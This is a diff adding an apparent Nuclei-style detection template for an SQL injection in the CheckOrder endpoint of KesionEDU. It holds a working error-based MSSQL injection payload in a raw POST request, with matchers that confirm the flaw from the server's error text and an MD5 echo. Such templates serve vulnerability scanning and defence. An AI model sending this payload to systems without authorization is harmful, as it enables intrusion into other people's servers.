@@ -1,0 +1,34 @@
+id: poc-yaml-kesion-edu-checkorder-sqli
+info:
+  name: 科汛网校KesionEDU CheckOrder SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Vulnerability in KesionEDU's CheckOrder endpoint allowing SQL injection.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /webapi/APP/CheckOrder HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        {"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))-- Ahbw","apptoken":"1","ordertype":"1"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+      - type: word
+        words:
+          - "0x{{t2}}"
+        part: body
